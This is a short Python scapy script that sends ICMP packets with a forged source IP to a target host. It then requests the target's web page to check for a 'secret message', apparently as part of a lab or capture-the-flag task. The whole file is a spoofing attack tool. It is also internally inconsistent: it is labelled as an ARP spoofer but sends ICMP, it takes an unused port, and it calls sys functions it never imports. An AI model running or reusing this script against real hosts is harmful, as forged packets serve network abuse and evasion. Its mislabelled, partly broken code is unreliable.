from scapy.all import *
from sys import argv
import requests


def send_spoofed_packet(target_ip, target_port, spoofed_ip, payload):
    # Create a packet with the spoofed source IP
    packet = IP(src=spoofed_ip, dst=target_ip) / ICMP() / payload

    # Send the packet
    send(packet, verbose=False)
    print(f"Sent packet with spoofed IP {spoofed_ip} to {target_ip}:{target_port} with payload: {payload}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 spoof_arp.py <IP1> <IP2> <PORT>")
        sys.exit(1)

    # Get tthe target IP, spoofed IP, and port from command line arguments
    target_ip = sys.argv[1]
    spoofed_ip = sys.argv[2]
    target_port = sys.argv[3]

    # Create a payload with length 22
    payload = "This is a test payload"
    payload = payload.ljust(22, 'x')  # Pad the payload to 22 bytes

    # Send two spoofed packets
    send_spoofed_packet(target_ip, target_port, spoofed_ip, payload)
    send_spoofed_packet(target_ip, target_port, spoofed_ip, payload)

    output = requests.get(f"http://{target_ip}")

    # Print the output to check if it contains the secret message
    print("Output from the target IP:")
    print(output.text)

if __name__ == "__main__":
    main()
